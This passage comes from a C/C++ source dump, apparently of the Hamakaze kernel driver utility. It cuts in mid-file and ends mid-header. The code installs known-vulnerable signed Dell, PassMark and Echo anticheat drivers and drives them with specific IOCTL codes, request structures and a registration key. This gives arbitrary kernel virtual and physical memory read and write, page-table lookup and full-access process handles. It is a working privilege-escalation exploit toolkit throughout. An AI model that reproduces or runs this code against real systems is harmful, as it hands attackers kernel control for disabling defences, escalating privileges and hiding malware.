* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/dell.h"

WCHAR g_DbUtilHardwareId[] = { L'R', L'O', L'O', L'T', L'\\', L'D', L'B', L'U', L't', L'i', L'l', L'D', L'r', L'v', L'2', 0, 0, 0, 0 };

#define DBUTILCAT_FILE TEXT("dbutildrv2.cat")
#define DBUTILINF_FILE TEXT("dbutildrv2.inf")

SUP_SETUP_DRVPKG g_DbUtilPackage;

/*
* DbUtilStartVulnerableDriver
*
* Purpose:
*
* Start vulnerable driver callback.
* Install DbUtil device.
*/
BOOL DbUtilStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL          bLoaded = FALSE;
    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
    LPWSTR        lpDeviceName = provLoadData->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        RtlSecureZeroMemory(&g_DbUtilPackage, sizeof(SUP_SETUP_DRVPKG));

        g_DbUtilPackage.CatalogFile = DBUTILCAT_FILE;
        g_DbUtilPackage.CatalogFileResourceId = IDR_DATA_DBUTILCAT;

        g_DbUtilPackage.InfFile = DBUTILINF_FILE;
        g_DbUtilPackage.InfFileResourceId = IDR_DATA_DBUTILINF;

        g_DbUtilPackage.Hwid = (BYTE*)&g_DbUtilHardwareId;
        g_DbUtilPackage.HwidLength = sizeof(g_DbUtilHardwareId);

        g_DbUtilPackage.InstallFlags = INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE;

        bLoaded = supSetupManagePnpDriverPackage(Context, TRUE, &g_DbUtilPackage);
    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }
    else {
        supShowWin32Error("[!] Vulnerable driver is not loaded", GetLastError());
    }

    return (Context->DeviceHandle != NULL);
}

/*
* DbUtilStopVulnerableDriver
*
* Purpose:
*
* Stop vulnerable driver callback.
* Uninstall DbUtil device and remove files.
*
*/
VOID DbUtilStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpFullFileName = Context->DriverFileName;

    supSetupRemoveDriver(g_DbUtilPackage.DeviceInfo, &g_DbUtilPackage.DeviceInfoData);
    supSetupManagePnpDriverPackage(Context, FALSE, &g_DbUtilPackage);

    if (supDeleteFileWithWait(1000, 5, lpFullFileName))
        printf_s("[+] Vulnerable driver file removed\r\n");
}

/*
* DbUtilReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    DWORD dwError = ERROR_SUCCESS;
    DBUTIL_READWRITE_REQUEST* pRequest;

    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

    pRequest = (DBUTIL_READWRITE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        pRequest->Unused = 0xDEADBEEF;
        pRequest->VirtualAddress = VirtualAddress;
        pRequest->Offset = 0;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_DBUTIL_READVM,
            pRequest,
            (ULONG)size,
            pRequest,
            (ULONG)size);

        if (!bResult) {
            dwError = GetLastError();
        }
        else {
            RtlCopyMemory(Buffer, pRequest->Data, NumberOfBytes);
        }

        supFreeLockedMemory(pRequest, size);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* DbUtilWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    DWORD dwError = ERROR_SUCCESS;

    DBUTIL_READWRITE_REQUEST* pRequest;

    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

    pRequest = (DBUTIL_READWRITE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        pRequest->Unused = 0xDEADBEEF;
        pRequest->VirtualAddress = VirtualAddress;
        pRequest->Offset = 0;
        RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_DBUTIL_WRITEVM,
            pRequest,
            (ULONG)size,
            pRequest,
            (ULONG)size);

        if (!bResult)
            dwError = GetLastError();

        supFreeLockedMemory(pRequest, size);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* DpdReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI DpdReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    PVOID pvBuffer = NULL;

    PCDCSRVC_READWRITE_REQUEST request;
    SIZE_T size;

    size = sizeof(PCDCSRVC_READWRITE_REQUEST) + NumberOfBytes;

    pvBuffer = (PVOID)supAllocateLockedMemory(size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE);

    if (pvBuffer) {

        request.PhysicalAddress.QuadPart = PhysicalAddress;
        request.Size = NumberOfBytes;
        request.Granularity = 0; //use direct memmove

        bResult = supCallDriver(DeviceHandle,
            IOCTL_PCDCSRVC_READPHYSMEM,
            &request,
            sizeof(PCDCSRVC_READWRITE_REQUEST),
            pvBuffer,
            NumberOfBytes);

        if (bResult) {

            RtlCopyMemory(Buffer,
                pvBuffer,
                NumberOfBytes);

        }

        supFreeLockedMemory(pvBuffer, size);
    }

    return bResult;
}

/*
* DpdWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI DpdWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    PCDCSRVC_READWRITE_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(PCDCSRVC_READWRITE_REQUEST) + NumberOfBytes;

    pRequest = (PCDCSRVC_READWRITE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Granularity = 0; //use direct memmove
        pRequest->Size = NumberOfBytes;

        //
        // Append data buffer to the tail.
        //
        RtlCopyMemory(
            RtlOffsetToPointer(pRequest, sizeof(PCDCSRVC_READWRITE_REQUEST)),
            Buffer,
            NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_PCDCSRVC_WRITEPHYSMEM,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* DellRegisterDriver
*
* Purpose:
*
* Dell drivers initialization routine.
*
*/
BOOL WINAPI DellRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG driverId = PtrToUlong(Param);
    ULONG keyValue = 0xA1B2C3D4;

    switch (driverId) {

    case IDR_PCDSRVC:

        return supCallDriver(DeviceHandle,
            IOCTL_PCDCSRVC_REGISTER,
            &keyValue,
            sizeof(ULONG),
            &keyValue,
            sizeof(ULONG));

    default:
        return TRUE;
    }
}

```

`Source/Hamakaze/idrv/dell.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       DELL.H
*
*  VERSION:     1.31
*
*  DATE:        10 Apr 2023
*
*  Dell drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Dell driver interface.
//

#define DBUTIL_DEVICE_TYPE (DWORD)0x9B0C

#define DBUTIL_FUNCTION_READVM  (DWORD)0x7B1
#define DBUTIL_FUNCTION_WRITEVM (DWORD)0x7B2

#define PCDCSRVC_FUNCTION_REGISTER (DWORD)0x801
#define PCDCSRVC_FUNCTION_READPHYS (DWORD)0x821
#define PCDCSRVC_FUNCTION_WRITEPHYS (DWORD)0x822

#define IOCTL_DBUTIL_READVM     \
    CTL_CODE(DBUTIL_DEVICE_TYPE, DBUTIL_FUNCTION_READVM, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9B0C1EC4

#define IOCTL_DBUTIL_WRITEVM    \
    CTL_CODE(DBUTIL_DEVICE_TYPE, DBUTIL_FUNCTION_WRITEVM, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9B0C1EC8

#define IOCTL_PCDCSRVC_REGISTER \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PCDCSRVC_FUNCTION_REGISTER, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222004

#define IOCTL_PCDCSRVC_READPHYSMEM  \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PCDCSRVC_FUNCTION_READPHYS, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222084

#define IOCTL_PCDCSRVC_WRITEPHYSMEM \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PCDCSRVC_FUNCTION_WRITEPHYS, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222088

//
// Virtual memory read/write
//
// Size of data to read/write calculated as: 
// InputBufferSize - sizeof packet header 0x18 bytes length
//
typedef struct _DBUTIL_READWRITE_REQUEST {
    ULONG_PTR Unused;
    ULONG_PTR VirtualAddress;
    ULONG_PTR Offset;
    UCHAR Data[ANYSIZE_ARRAY];
} DBUTIL_READWRITE_REQUEST, * PDBUTIL_READWRITE_REQUEST;

//
// Physical memory read/write for DELL PC Doctor
//
// Sizeof 13 bytes.
//
#pragma pack(push, 1)
typedef struct _PCDCSRVC_READWRITE_REQUEST {
    PHYSICAL_ADDRESS PhysicalAddress;
    ULONG Size;
    BYTE Granularity;
    // UCHAR Data[ANYSIZE_ARRAY]; //not a part of this structure
} PCDCSRVC_READWRITE_REQUEST, *PPCDCSRVC_READWRITE_REQUEST;
#pragma pack(pop)

_Success_(return != FALSE)
BOOL WINAPI DbUtilReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI DbUtilWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL DbUtilStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

VOID DbUtilStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

BOOL WINAPI DpdReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI DpdWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI DellRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

```

`Source/Hamakaze/idrv/directio64.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       DIRECTIO64.CPP
*
*  VERSION:     1.27
*
*  DATE:        12 Nov 2022
*
*  PassMark DIRECTIO driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/directio64.h"

//
// PassMark's DIRECTIO interface.
// 
// N.B. This driver itself is *extremely* vulnerable/bugged.
//

/*
* DI64MapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID DI64MapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* AllocatedMdl,
    _In_ BOOLEAN MapForWrite)
{
    DIRECTIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *AllocatedMdl = NULL;

    ULONG_PTR offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    ULONG mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = mapSize;
    request.Offset.QuadPart = offset;
    request.Writeable = MapForWrite;

    if (supCallDriver(DeviceHandle,
        IOCTL_DIRECTIO_MAP_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request))) 
    {
        *SectionHandle = request.SectionHandle;
        *AllocatedMdl = request.AllocatedMdl;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* DI64UnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID DI64UnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID AllocatedMdl
)
{
    DIRECTIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.AllocatedMdl = AllocatedMdl;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        IOCTL_DIRECTIO_UNMAP_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* DI64QueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI DI64QueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    ULONG cbRead = 0x100000;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)DI64MapMemory(DeviceHandle,
        0ULL,
        cbRead,
        &sectionHandle,
        &refObject,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        DI64UnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle,
            refObject);

    }

    return (PML4 != 0);
}

/*
* DI64ReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI DI64ReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    PVOID allocMdl = NULL;
    HANDLE sectionHandle = NULL;

    ULONG_PTR offset;

    mappedSection = DI64MapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &allocMdl,
        DoWrite);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        DI64UnmapMemory(DeviceHandle,
            mappedSection,
            sectionHandle,
            allocMdl);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* DI64ReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI DI64ReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return DI64ReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* DI64WritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI DI64WritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return DI64ReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* DI64VirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI DI64VirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        DI64QueryPML4Value,
        DI64ReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* DI64ReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI DI64ReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = DI64VirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = DI64ReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* DI64WriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI DI64WriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = DI64VirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = DI64ReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/directio64.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2021
*
*  TITLE:       DIRECTIO64.H
*
*  VERSION:     1.11
*
*  DATE:        18 Apr 2021
*
*  PassMark DIRECTIO driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define DIRECTIO_DEVICE_TYPE            (DWORD)0x8011
#define DIRECTIO_OPEN_PHYSMEM_FUNCID    (DWORD)0x81F
#define DIRECTIO_MAP_PHYSMEM_FUNCID     (DWORD)0x811
#define DIRECTIO_UNMAP_PHYSMEM_FUNCID   (DWORD)0x812

#define IOCTL_DIRECTIO_OPEN_PHYSICAL_MEMORY      \
    CTL_CODE(DIRECTIO_DEVICE_TYPE, DIRECTIO_OPEN_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_READ_ACCESS) //0x8011607C

#define IOCTL_DIRECTIO_MAP_PHYSICAL_MEMORY       \
    CTL_CODE(DIRECTIO_DEVICE_TYPE, DIRECTIO_MAP_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x8011E044

#define IOCTL_DIRECTIO_UNMAP_PHYSICAL_MEMORY     \
    CTL_CODE(DIRECTIO_DEVICE_TYPE, DIRECTIO_UNMAP_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x8011E048

#pragma pack(push, 1)
typedef struct _DIRECTIO_PHYSICAL_MEMORY_INFO {
    HANDLE SectionHandle;
    PVOID BaseAddressIoSpace;
    PVOID AllocatedMdl;
    DWORD ViewSize;
    PHYSICAL_ADDRESS Offset;
    PVOID BaseAddress;
    BOOLEAN Writeable;
} DIRECTIO_PHYSICAL_MEMORY_INFO, * PDIRECTIO_PHYSICAL_MEMORY_INFO; //sizeof 45 bytes
#pragma pack(pop)

BOOL WINAPI DI64VirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI DI64QueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI DI64ReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI DI64WriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI DI64ReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI DI64WritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/echodrv.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ECHODRV.CPP
*
*  VERSION:     1.40
*
*  DATE:        21 Oct 2023
*
*  Inspect Element LTD spyware (anticheat) driver interface.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//
// Based on https://github.com/kite03/echoac-poc/tree/main/PoC
//

#include "global.h"
#include "idrv/echodrv.h"

HANDLE gEchoDrvClientHandle = NULL;

/*
* EchoDrvReadWriteVirtualMemory
*
* Purpose:
*
* Read/Write virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvReadWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite
)
{
    ECHODRV_COPYVM_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    if (DoWrite) {
        request.FromAddress = Buffer;
        request.ToAddress = (PVOID)VirtualAddress;
    }
    else {
        request.FromAddress = (PVOID)VirtualAddress;
        request.ToAddress = Buffer;
    }

    request.BufferSize = (SIZE_T)NumberOfBytes;
    request.ProcessHandle = gEchoDrvClientHandle;

    return supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_COPYVM,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* EchoDrvWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
        VirtualAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* EchoDrvReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
        VirtualAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* EchoDrvRegisterDriver
*
* Purpose:
*
* Echo client registration routine.
*
*/
BOOL WINAPI EchoDrvRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    BOOL bResult;
    ECHODRV_REGISTER regRequest;
    ECHODRV_OPENPROCESS_REQUEST procRequest;

    RtlSecureZeroMemory(&regRequest, sizeof(regRequest));

    //
    // Send empty buffer so this crapware driver will remember client pid to it global variable.
    // Theorerically this BS driver should do some crypto next-gen calculations but life is
    // not working as authors expected.
    //

    bResult = supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_REGISTER,
        &regRequest,
        sizeof(regRequest),
        &regRequest,
        sizeof(regRequest));

    if (bResult) {

        //
        // Only to make MmCopyVirtualMemory work as it expects process object as param. 
        // 
        // However we are working with kernel VA and KernelMode processor mode is set by AC.
        //
        RtlSecureZeroMemory(&procRequest, sizeof(procRequest));

        procRequest.ProcessId = GetCurrentProcessId();
        procRequest.DesiredAccess = GENERIC_ALL;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_ECHODRV_OPEN_PROCESS,
            &procRequest,
            sizeof(procRequest),
            &procRequest,
            sizeof(procRequest));

        if (bResult)
            gEchoDrvClientHandle = procRequest.ProcessHandle;

    }

    return bResult;
}

/*
* EchoDrvUnregisterDriver
*
* Purpose:
*
* Echo unregister routine.
*
*/
BOOL WINAPI EchoDrvUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(DeviceHandle);
    UNREFERENCED_PARAMETER(Param);

    if (gEchoDrvClientHandle)
        NtClose(gEchoDrvClientHandle);

    return TRUE;
}

/*
* EchoDrvOpenProcess
*
* Purpose:
*
* Open process via Echo driver.
*
*/
BOOL WINAPI EchoDrvOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle)
{
    BOOL bResult = FALSE;
    ECHODRV_OPENPROCESS_REQUEST procRequest;

    RtlSecureZeroMemory(&procRequest, sizeof(procRequest));

    procRequest.ProcessId = HandleToUlong(ProcessId);
    procRequest.DesiredAccess = DesiredAccess;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_OPEN_PROCESS,
        &procRequest,
        sizeof(procRequest),
        &procRequest,
        sizeof(procRequest));

    *ProcessHandle = procRequest.ProcessHandle;

    return bResult;
}

```

`Source/Hamakaze/idrv/echodrv.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ECHODRV.H
*
*  VERSION:     1.40
*
*  DATE:        21 Oct 2023
*
*  Inspect Element LTD spyware (anticheat) driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Echo.ac driver uses a ridiculous IOCTL scheme which could be a side effect of intense copy-paste. 
//

#define ECHODRV_DEVICE_TYPE         (DWORD)0x9E6A
#define ECHODRV_INTERFACE_TYPE_1    (DWORD)0xE622
#define ECHODRV_INTERFACE_TYPE_2    (DWORD)0x60A2

#define ECHODRV_FUNCTION_REGISTER       (DWORD)0x165
#define ECHODRV_FUNCTION_OPEN_PROCESS   (DWORD)0x92
#define ECHODRV_FUNCTION_COPYVM         (DWORD)0x849

#define IOCTL_ECHODRV_REGISTER          \
    CTL_CODE(ECHODRV_DEVICE_TYPE, ECHODRV_FUNCTION_REGISTER, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9E6A0594

